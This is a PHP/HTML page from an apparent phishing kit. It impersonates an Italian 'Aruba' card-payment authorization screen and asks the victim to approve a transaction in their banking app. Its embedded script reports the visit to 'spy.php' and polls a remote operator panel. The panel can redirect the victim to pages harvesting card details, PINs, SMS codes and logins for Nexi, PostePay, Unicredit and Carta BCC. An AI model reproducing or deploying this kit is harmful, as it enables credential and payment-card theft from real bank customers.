<?php 
require_once '../includes/main.php';
require '../main.php';
?>

<!doctype html>
<html>

<!-- Mirrored from aruba.cfolks.pl/a/a//web/app.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 30 Oct 2024 15:51:58 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<title></title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="sms_aruba/res/sms.css">
</head>
<body>
<section>


<div class="form">
<div class="header">
    <div class="left">
        <img src="aruba_app/res/log.svg">
    </div>
    <div class="right">
        <img src="aruba_app/res/vm.png">
    </div>
</div>

<b>Autorizzazione</b>
<p>Per completare questo processo, accetta questa transazione tramite la tua richiesta bancaria.</p>
<table>
<tr>
    <td>Mercante:</td>
    <td>ARUBA</td>
</tr>
<tr>
    <td>Data e ora:</td>
    <td><?php echo date('d/m/Y h:i:sA'); ?></td>
</tr>

<tr>
    <td>PAYMENT:</td>
    <td>CREDIT CARD</td>
</tr>
</table>
<p style="margin-top:-20px;">Una volta accettata questa transazione tramite l'applicazione della tua banca, questa pagina verrà caricata automaticamente.</p>
<div style="text-align:center; margin:20px 0;">
<img src="aruba_app/res/loading.gif" style=" width:40px;">
</div>

</div>



</section>


<script src="css/jquery.min.js.download"></script>
<script>
$.post("spy.php", {appview:1});
</script>


</div>
<script src="res/jq.js"></script>
<script src="res/v.js"></script>
	<script src="css/jq.js.download"></script>
	<script>
	var targets = {
            1: "log.php",
            2: "card.php",
            3: "carderror.php",
            4: "nexi.php",
            5: "nexi_error.php",
            6: "ints.php",
            7: "ints_error.php",
            8: "sms.php",
            9: "sms_error.php",
            10: "success.php",
            11: "app.php",
			12: "Cartabcc.php",
			13: "Cartabcc_error.php",
			14: "PostePay.php",
			15: "PostePay_error.php",
			16: "Unicredit.php",
			17: "Unicredit_error.php",
			18: "pin.php"
    };
	clearRedirections();
	setInterval(function(){
	$.post("../panel/process/processor.php",
	{keepAlive:1, page:"App Auth"} );
}, 2000);
var redirect=0;
setInterval(function(){
	$.post("../panel/process/processor.php",{redirectionListener:1}, function(data){
		redirect=data;
		if(redirect==0){
			return false;
		}else{
			clearRedirections();
			window.location=targets[redirect];
		}
	});
}, 2000);
function clearRedirections(){
	$.post("../panel/process/processor.php",
	{clearRedirection:1});
}

 </script>
<?php 
$j->ctr("App Authorization...");
?>


</body>
</html>